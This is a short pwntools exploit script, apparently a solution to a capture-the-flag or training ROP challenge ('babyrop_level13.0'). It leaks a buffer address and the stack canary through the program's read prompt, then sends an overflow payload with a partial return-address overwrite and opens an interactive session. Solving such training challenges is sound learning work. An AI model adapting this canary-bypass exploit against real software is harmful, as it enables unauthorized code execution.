from pwn import *
import time 

binary = './babyrop_level13.0_patched'
elf = ELF(binary)

context.binary = binary
p = process(binary)


s = '''
b *main+769
'''

libc_main_offset = 0x29cf0
offset = 0x50
p.recvuntil(b"Your input buffer is located at: ")
buffer_addr = int(p.recvuntil(b".\n\n", drop=True), 16)
print(f"[+] Input buffer is at: {hex(buffer_addr)}")



canary_addr = buffer_addr + offset - 0x8
p.sendlineafter(b"Address in hex to read from:\n", hex(canary_addr).encode())
p.recvuntil(b" = ")
canary = int(p.recvuntil(b"\n", drop=True), 16)
print(f"[+] Canary value: {hex(canary)}")

start_addr_ptr = buffer_addr + 0x108

gdb.attach(p, s)


payload = flat(
	b'A' * 8,
	b'A'* 0x40,
	canary,
	start_addr_ptr - 8,
	b'\xc8\x58\x26'
)

p.send(payload)




p.interactive()
